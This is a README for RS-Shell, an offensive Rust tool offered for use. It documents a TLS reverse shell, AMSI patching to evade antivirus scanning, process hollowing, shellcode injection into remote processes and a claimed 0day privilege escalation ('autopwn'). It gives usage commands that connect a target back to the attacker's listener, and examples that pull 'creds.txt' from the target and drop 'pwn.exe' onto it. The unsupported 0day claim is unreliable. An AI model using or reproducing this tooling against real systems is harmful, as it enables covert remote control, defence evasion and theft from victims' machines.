*"The worst Rust programmer you have ever seen"* - my mom
*"But at least it works"* - still my mom, but not about me

# RS-Shell

RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved.
Client and server are both cross-platform and work on Windows and Linux systems.

For Windows client, additonal features have been integrated for offensive purpose, and they will be improved in futur commits.
For this purpose, I have chosen to mainly use the official [windows_sys](https://docs.rs/windows-sys/latest/windows_sys/) crate to interact with the Win32API and the [ntapi](https://docs.rs/ntapi/latest/ntapi/) crate for the NTAPI.

The project is thought in module. This means that you can easily add or remove features to and from it, and you can also easily take parts from it to put them in your own project.

## Features

For the moment, the following features are present:

* Semi-interactive reverse shell via TLS over TCP
* File upload and download between server and client
* Start a PowerShell interactive session with the ability to patch the AMSI in memory
* Loading features :
  * Load and execute a PE in the client memory
  * Load and execute a PE in a remote process memory
  * Load and execute a shellcode in a remote process memory
* Autopwn the client machine and elevate the privileges to SYSTEM or root by exploiting a 0day in `tcpdump`

## How to

### Setup

First of all, the full path of your TLS certificate and its password must be configured in the file `server.rs` in place of the tags `[CERTFICATE_PATH]` and `[CERTIFICATE_PASSWORD]`.
Additionally, I have set a `dummy` domain for hostname validation in the `connect()` function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.

By default, only the `error`, `warn` and `info` logs are displayed. If you also need the `debug` ones (can be usefull for the loading features), you can change this in `main.rs` by modifying `::log::set_max_level(LevelFilter::Info);` to `::log::set_max_level(LevelFilter::Debug);`.

### Compilation

The project can be compiled with `cargo build --release` on Windows or Linux and the binary will be present in `target/release/`.
Tu compile for a different target than your current OS you can use `cargo build --release --target x86_64-unknown-linux-gnu`

The project compilation has been tested with the following Rust toolchains :

* `stable-x86_64-pc-windows-gnu`
* `stable-x86_64-pc-windows-msvc`
* `stable-x86_64-unknown-linux-gnu`

If you compile the project for a Linux target, the "Windows features" will be removed at compilation.
Should run on all Windows and Linux versions (I have hope).

### Usage

```plain
Usage : shell.exe [l | c] IP port

    l       launch the listener application
    c       launch the client application

    IP      IP address to bind to for the listener, or to connect to for the client
    port    port address to bind to for the listener, or to connect to for the client

    In a session, type 'help' for advanced integrated commands
```

To obtain a session, just launch the binary in listener mode on your machine with `rs-shell.exe l IP_to_bind_to port_to_bind_to`. For example `rs-shell.exe l 0.0.0.0 4545`.
Then, on the target machine launch the client to connect back to your server with `rs-shell.exe c IP_to_connect_to port_to_connect_to`. For example `rs-shell.exe c 192.168.1.10 4545`.

### Advanced commands

```plain
> help
[+] Custom integrated commands :

    [+] Loading commands
    > load C:\path\to\PE_to_load
        load a PE file in the client process memory and executes it. This could kill the reverse shell !
    > load -h C:\path\to\PE_to_load C:\path\to\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it
    > load -s C:\path\to\shellcode.bin C:\path\to\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it

    [+] Bypass commands
    > powpow
        start a new interactive PowerShell session with the AMSI patched in memory

    [+] Network commands
    > download C:\file\to\download C:\local\path
        download a file from the remote system
    > upload C:\local\file\to\upload C:\remote\path\to\write
        upload a file to the remote system

    [+] Special commands
    > autopwn
        escalate to the SYSTEM account from any local account by exploiting a zero day
```

The `load` commands permit to load and execute directly in memory:

* `load` loads and execute a PE in the client memory. This will kill the reverse shell, but that could be usefull to launch a C2 implant in the current process for example
* `load -h` loads and execute a PE in a created remote process memory with process hollowing. You don't lose your reverse shell session, but the process hollowing will be potentially flag by the AV or the EDR
* `load -s` loads and execute a shellcode from a `.bin` file in a created remote process memory. You don't lose your reverse shell session, and you don't have to drop the bin file on the target, since the shellcode will be transfered to the target via the TCP tunnel

For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.exe`. This will start a `cmd.exe` process with hollowing, load a `calc.exe` image in the process memory, and then resume the thread to execute the calc.

`powpow` starts an interactive PowerShell session with a PowerShell process where the AMSI `ScanBuffer` function has been patched in memory. This feature is not particularly opsec.

`download` permits to download a file from the client to the machine where the listener is running. For example `download C:\Users\Administrator\Desktop\creds.txt ./creds.txt`.
`upload` permits to upload a file on the client machine. For example `upload ./pwn.exe C:\Temp\pwn.exe`.

`autopwn` permits to escalate to the **SYSTEM account** with a 0day exploitation. Just type `autopwn` and answer the question.

## Todo

- [ ] Move all the Win32API related commands to the NTAPI with indirect syscalls
- [ ] Implement other injection techniques
- [ ] Implement a port forwarding solution
- [ ] Find a way to create a fully proxy aware client
- [ ] Implement a reverse socks proxy feature

## Acknowledgements

* [OffensiveRust](https://github.com/winsecurity/Offensive-Rust) by [winsecurity](https://github.com/winsecurity). This project would never have existed without him. Many of functions, structures, and tricks present in `rs-shell` come from this project
* [OffensiveRust](https://github.com/trickster0/OffensiveRust) by [trickster0](https://github.com/trickster0)
* Multiple projects by [memN0ps](https://github.com/memN0ps)
* [RustPacker](https://github.com/Nariod/RustPacker) by [Nariod](https://github.com/Nariod)
* Nik Brendler's blog posts about pipe communication between process in Rust. [Part 1](https://www.nikbrendler.com/rust-process-communication/) and [Part 2](https://www.nikbrendler.com/rust-process-communication-part-2/)
